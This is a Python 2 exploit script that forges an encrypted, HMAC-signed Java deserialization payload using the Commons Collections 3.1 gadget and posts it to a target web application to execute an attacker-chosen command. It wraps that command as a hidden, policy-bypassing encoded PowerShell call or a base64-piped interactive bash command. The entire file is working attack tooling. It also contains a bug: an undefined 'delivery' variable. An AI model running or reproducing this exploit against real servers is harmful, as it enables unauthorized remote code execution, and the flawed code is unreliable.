#!/usr/bin/env python

import base64
from hashlib import sha1
import hmac
import pyDes
import binascii
import requests
import sys
import argparse
import java_exploits as exploits

RED = '\x1b[91m'
GREEN = '\033[32m'
ENDC = '\033[0m'

#TODO: Add separate syntax for when the secret is different between the encryption and HMAC
def get_args():
    parser = argparse.ArgumentParser(description="Lord of Cereal: One Bowl to Rule them All", epilog="We're going to need a bigger bowl for all this cereal!\n")
    parser.add_argument('-u', '--url', type=str, help="Target vulnerable URL", required=True)
    parser.add_argument('-e', '--encryption', type=str, help="Encryption mode: DES (Only DES supported currently)", required=True)
    parser.add_argument('-s', '--secret', type=str, help="Encryption/HMAC secret", required=True)
    parser.add_argument('-p', '--payload', type=str, help="Java payload method: commons3 (Only commons3 currently)", required=True)
    parser.add_argument('-t', '--token', type=str, help="Name of token or parameter", required=True)
    parser.add_argument('-c', '--command', type=str, help="Command to be executed", required=True)
    parser.add_argument('-f', '--format', type=str, help="Method format for payload. Options: [powershell, bash]", required=False)

    args = parser.parse_args()
    URL = args.url
    encryptMethod = args.encryption
    secret_key = args.secret
    payload_type = args.payload
    parameter = args.token
    command = args.command
    format = args.format

    return URL, encryptMethod, secret_key, payload_type, parameter, command, format


#HMAC digest creation
#TODO: Add other digests
def hmac_signature(secret, string):
    hashed = hmac.new(secret,string,sha1)
    return hashed.hexdigest()


#Default encryption mode for Apache
#TODO: Add other encryption modes
#Removed hardcoded value and added variable -- fix if needed
def encryptDES_ECB(data, key):
    k = pyDes.des(key, pyDes.ECB, IV=None, pad=None, padmode=pyDes.PAD_PKCS5)
    d = k.encrypt(data)
    assert k.decrypt(d, padmode=pyDes.PAD_PKCS5) == data
    return d


#Function to assemble the complete encrypted payload + HMAC digest
def buildPayload(command, encryptMethod, secret_key, payload_type):
    serialized_javas = exploits.generate_commons_collections31_payload(command)
    cipher = encryptDES_ECB(serialized_javas,secret_key)
    hmac_digest = hmac_signature(secret_key, cipher)
    completed_payload = binascii.hexlify(cipher) + hmac_digest
    b64_encrypted_payload = base64.b64encode(binascii.unhexlify(completed_payload))
    return b64_encrypted_payload


#TODO: Add python and perl
#Function to create a b64ed powershell command as the payload delivery method
def powerShelled(command):
    ps_b64 = base64.b64encode(command.encode("UTF-16LE"))
    ps_command = "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc " + ps_b64
    return ps_command

#Function to create a b64ed bash command as the payload delivery method
def bashed(command):
    bash_b64 = base64.b64encode(command)
    bash_command = "bash -c {echo," + bash_b64 + "}|{base64 -d}|{bash -i}"
    return bash_command


if __name__ == "__main__":
    URL, encryptMethod, secret_key, payload_type, parameter, command, format = get_args()
    if format == "powershell":
        mod_command = powerShelled(command)

    elif delivery == "bash":
        mod_command = bashed(command)

    else:
        print "Could not identify delivery method. Exiting..."

    fullPayload = buildPayload(mod_command,encryptMethod,secret_key,payload_type)

    print (GREEN + "[*]" + ENDC) + " Sending encrypted serialized payload to server..."
    r = requests.post(URL,data={parameter:fullPayload})
    if r.status_code == 500 or r.status_code == 200:
        print (GREEN + "[*]" + ENDC) + " Payload received by server."
    else:
        print (RED + "[*]" + ENDC) + " An error occurred."
        sys.exit(0)
